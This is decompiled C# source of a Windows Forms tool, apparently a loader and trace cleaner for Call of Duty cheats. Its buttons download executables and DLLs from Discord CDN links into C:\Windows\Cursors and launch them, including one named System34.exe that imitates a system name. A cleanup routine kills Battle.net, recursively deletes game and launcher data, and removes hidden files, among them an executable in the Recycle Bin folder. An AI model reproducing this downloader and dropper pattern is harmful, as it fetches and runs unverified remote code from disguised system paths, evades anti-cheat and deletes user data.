using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using LogIn_Theme_Dll_By_xVenoxi;
using TestKey.Properties;

namespace TestKey
{
	// Token: 0x0200000E RID: 14
	public partial class Form2 : Form
	{
		// Token: 0x0600008C RID: 140 RVA: 0x000023BC File Offset: 0x000005BC
		public Form2()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00004AF0 File Offset: 0x00002CF0
		private void logInButton1_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Please Wat A Few Seconds");
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/958106542253674566/Newtonsoft.Json.dll", "C:\\Windows\\Cursors\\Newtonsoft.Json.dll");
			WebClient webClient2 = new WebClient();
			webClient2.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/958106457331613736/ReaLTaiizor.dll", "C:\\Windows\\Cursors\\ReaLTaiizor.dll");
			WebClient webClient3 = new WebClient();
			webClient3.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/958106457881075722/System.Diagnostics.EventLog.dll", "C:\\Windows\\Cursors\\System.Diagnostics.EventLog.dll");
			WebClient webClient4 = new WebClient();
			webClient4.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/958106458094981150/System.Security.Principal.Windows.dll", "C:\\Windows\\Cursors\\System.Security.Principal.Windows.dll");
			WebClient webClient5 = new WebClient();
			webClient5.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/958106458325647441/System.ServiceProcess.ServiceController.dll", "C:\\Windows\\Cursors\\System.ServiceProcess.ServiceController.dll");
			WebClient webClient6 = new WebClient();
			webClient6.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/961414376018047016/OC.exe", "C:\\Windows\\Cursors\\OC.exe");
			MessageBox.Show("Initilizing Completed!", "Success!");
			Process.Start("C:\\Windows\\Cursors\\OC.exe");
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00004BB4 File Offset: 0x00002DB4
		private void logInButton2_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Please Wat A Few Seconds");
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/974753032917094460/Newtonsoft.Json.dll", "C:\\Windows\\Cursors\\Newtonsoft.Json.dll");
			WebClient webClient2 = new WebClient();
			webClient2.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/974753019226886214/ReaLTaiizor.dll", "C:\\Windows\\Cursors\\ReaLTaiizor.dll");
			WebClient webClient3 = new WebClient();
			webClient3.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/974753018568376460/System.Diagnostics.EventLog.dll", "C:\\Windows\\Cursors\\System.Diagnostics.EventLog.dll");
			WebClient webClient4 = new WebClient();
			webClient4.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/974753018786496562/System.Security.Principal.Windows.dll", "C:\\Windows\\Cursors\\System.Security.Principal.Windows.dll");
			WebClient webClient5 = new WebClient();
			webClient5.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/974753019008806932/System.ServiceProcess.ServiceController.dll", "C:\\Windows\\Cursors\\System.ServiceProcess.ServiceController.dll");
			WebClient webClient6 = new WebClient();
			webClient6.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/961414376018047016/OC.exe", "C:\\Windows\\Cursors\\OC.exe");
			WebClient webClient7 = new WebClient();
			webClient7.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/974753032652873738/FontAwesome.Sharp.dll", "C:\\Windows\\Cursors\\FontAwesome.Sharp.dll");
			WebClient webClient8 = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/958098436496973867/974753799019331604/System34.exe", "C:\\Windows\\Cursors\\System34.exe");
			MessageBox.Show("Initilizing Completed!", "Success!");
			Process.Start("C:\\Windows\\Cursors\\System34.exe");
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00004CA8 File Offset: 0x00002EA8
		private void logInButton3_Click(object sender, EventArgs e)
		{
			string[] array = new WebClient().DownloadString("https://pastebin.pl/view/raw/f15d4de1").Split(new char[]
			{
				'\n'
			});
			string value = array[new Random().Next(0, array.Length)];
			this.Output.Text = Convert.ToString(value);
		}

		// Token: 0x06000090 RID: 144 RVA: 0x000023D4 File Offset: 0x000005D4
		private void logInButton4_Click(object sender, EventArgs e)
		{
			Process.Start("https://pastebin.com/XH1MNSqu");
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00004CFC File Offset: 0x00002EFC
		private void logInButton5_Click(object sender, EventArgs e)
		{
			string[] array = new WebClient().DownloadString("https://pastebin.pl/view/raw/aa13f655").Split(new char[]
			{
				'\n'
			});
			this.OutputV1.Text = array[new Random().Next(0, array.Length)];
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00004D48 File Offset: 0x00002F48
		private void logInButton6_Click(object sender, EventArgs e)
		{
			bool flag = Process.GetProcessesByName("Battle.net").Length != 0;
			if (flag)
			{
				MessageBox.Show("Battle.net was closed successfully! Please make sure to end the process the next time before cleaning!!", "WARNING", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Process[] processesByName = Process.GetProcessesByName("Battle.net");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
			folderBrowserDialog.Description = "SELECT THE MODERN WARFARE FOLDER\nOften it is located in >>> \nC:/Program Files(x86)/Call of Duty Modern Warfare ";
			folderBrowserDialog.RootFolder = Environment.SpecialFolder.MyComputer;
			folderBrowserDialog.ShowNewFolderButton = false;
			bool flag2 = folderBrowserDialog.ShowDialog() == DialogResult.OK;
			if (flag2)
			{
				string selectedPath = folderBrowserDialog.SelectedPath;
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
				string path = Path.Combine(folderPath, "Call of Duty Modern Warfare");
				string path2 = Path.Combine(folderPath2, "Battle.net");
				string path3 = Path.Combine(folderPath2, "Blizzard Entertainment");
				string path4 = Path.Combine(folderPath2, "Activision");
				string path5 = Path.Combine(folderPath2, "CrashDumps");
				string path6 = Path.Combine(folderPath3, "Battle.net");
				string path7 = Path.Combine(folderPath4, "Battle.net");
				string path8 = Path.Combine(folderPath4, "Blizzard Entertainment");
				string path9 = Path.Combine(selectedPath, "main");
				string path10 = Path.Combine(selectedPath, "data", "data");
				string path11 = Path.Combine(path10, "shmem");
				string path12 = Path.Combine(selectedPath, "BlizzardBrowser");
				string path13 = Path.Combine(path10, "config");
				string path14 = Path.Combine(path10, "indices");
				string path15 = Path.Combine(Path.Combine(selectedPath, "telescopeCache"), "telescope_index.dat");
				string path16 = Path.Combine(selectedPath, "xpak_cache");
				string path17 = Path.Combine(selectedPath, "blob_storage");
				string path18 = "C:\\Windows\\Cursors\\ul4.exe";
				string path19 = "C:\\Windows\\Cursors\\RunAsAdmin.exe";
				string path20 = "C:\\Windows\\Cursors\\System.Diagnostics.EventLog.dll";
				string path21 = "C:\\Windows\\Cursors\\System.Security.Principal.Windows.dll";
				string path22 = "C:\\Windows\\Cursors\\System.ServiceProcess.ServiceController.dll";
				string path23 = "C:\\Windows\\Cursors\\ReaLTaiizor.dll";
				string path24 = "C:\\Windows\\Cursors\\Newtonsoft.Json.dll";
				string path25 = "C:\\$Recycle.Bin\\windowslocalhost.exe";
				try
				{
					Directory.Delete(path, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path2, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path3, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path6, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path7, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path8, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path12, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path13, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path14, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path4, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path5, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path9, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path16, true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(path17, true);
				}
				catch
				{
				}
				try
				{
					File.Delete(path11);
					File.Delete(path15);
					Console.Beep();
					MessageBox.Show("All trace files for Call of Duty Modern Warfare has been deleted successfully!");
				}
				catch
				{
					MessageBox.Show("Not all trace files could be found!");
				}
				try
				{
					File.Delete(path18);
					File.Delete(path19);
					File.Delete(path20);
					File.Delete(path21);
					File.Delete(path22);
					File.Delete(path23);
					File.Delete(path24);
					File.Delete(path25);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00002399 File Offset: 0x00000599
		private void logInThemeContainer1_Click(object sender, EventArgs e)
		{
		}
	}
}
